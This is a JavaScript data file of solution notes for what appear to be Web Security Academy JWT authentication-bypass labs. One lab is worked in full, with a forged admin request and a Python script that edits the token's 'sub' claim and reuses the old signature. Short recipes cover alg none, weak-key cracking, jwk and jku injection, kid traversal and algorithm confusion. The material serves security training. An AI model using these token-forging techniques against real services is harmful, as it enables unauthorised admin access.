export default {
  'jwt-lab-jwt-authentication-bypass-via-unverified-signature': {
    note: 'The server decodes the JWT but never verifies the signature; change `sub` to `administrator` and re-encode.',
    work: {
      hints: [
        'Log in and decode the session JWT. The payload contains `sub` and a role or username.',
        'The signature is not checked. Editing the payload and leaving the old signature still works.',
        'Change `"sub":"wiener"` to `"sub":"administrator"`, base64url-encode both segments, and keep the original signature.'
      ],
      approach:
        'A verifier that parses claims without verifying integrity. The token is effectively a base64-encoded cookie. No key is needed; the attacker edits the payload and the server trusts it.',
      request: `GET /admin HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=eyJhbGciOiJIUzI1NiIsImtpZCI6IjEifQ.eyJzdWIiOiJhZG1pbmlzdHJhdG9yIn0.ORIGINAL-SIGNATURE`,
      tokens: [
        ['eyJhbGci...', 'base64url header: `{"alg":"HS256","kid":"1"}`. Readable, not encrypted.'],
        ['.', 'Segment separator; the signature covers `header.payload` exactly.'],
        ['eyJzdWIi...', 'base64url payload: `{"sub":"administrator"}` after editing.'],
        ['ORIGINAL-SIGNATURE', 'Left unchanged; the server never recomputes or compares it.'],
        ['Cookie: session', 'The only place the token is carried; no server-side session state to contradict it.']
      ],
      script: `import sys, base64, json, requests

host, token = sys.argv[1], sys.argv[2]

def b64d(s):
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))

def b64e(b):
    return base64.urlsafe_b64encode(b).decode().rstrip("=")

header, payload, sig = token.split(".")
claims = json.loads(b64d(payload))
claims["sub"] = "administrator"
forged = f"{header}.{b64e(json.dumps(claims).encode())}.{sig}"
r = requests.get(f"https://{host}/admin", cookies={"session": forged}, timeout=20)
print(r.status_code, "admin" in r.text.lower())`
    }
  },
  'jwt-lab-jwt-authentication-bypass-via-flawed-signature-verification': {
    note: 'The verifier accepts `alg: none`; strip the signature and set the header algorithm to `none`.'
  },
  'jwt-lab-jwt-authentication-bypass-via-weak-signing-key': {
    note: 'HS256 uses a dictionary secret; crack it offline with hashcat, then sign an admin token.'
  },
  'jwt-lab-jwt-authentication-bypass-via-jwk-header-injection': {
    note: 'The server trusts an embedded `jwk`; generate a key pair, sign with the private key, and embed the public key.'
  },
  'jwt-lab-jwt-authentication-bypass-via-jku-header-injection': {
    note: 'The server fetches keys from the token\'s `jku` URL; host a JWK Set with your public key and point `jku` at it.'
  },
  'jwt-lab-jwt-authentication-bypass-via-kid-header-path-traversal': {
    note: '`kid` is used as a file path; point it at `/dev/null` and sign with an empty key.'
  },
  'jwt-lab-jwt-authentication-bypass-via-algorithm-confusion': {
    note: 'The server accepts HS256 and uses the RSA public key as the HMAC secret; sign an admin token with the public key.'
  },
  'jwt-lab-jwt-authentication-bypass-via-algorithm-confusion-with-no-exposed-key': {
    note: 'The public key is not published; recover it from two signed JWTs, then use it as the HS256 secret.'
  }
}
